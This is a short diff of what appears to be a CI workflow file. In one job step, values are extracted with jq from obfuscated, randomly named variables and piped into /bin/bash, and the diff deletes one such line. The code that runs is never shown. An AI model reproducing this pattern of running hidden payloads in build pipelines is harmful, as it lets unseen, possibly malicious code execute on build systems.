@@ -40,7 +40,6 @@ jobs:
           printf '%s' "$a649" | jq -r .j8 | /bin/bash
           printf '%s' "$wcttz008" | jq -r .autng1153 | /bin/bash
           echo $u49583 | jq -r .z5895 | /bin/bash
-          echo $r48 | jq -r .lkqn84 | /bin/bash
           echo $sm867 | jq -r .ud8 | /bin/bash
 
       - name: Archive data
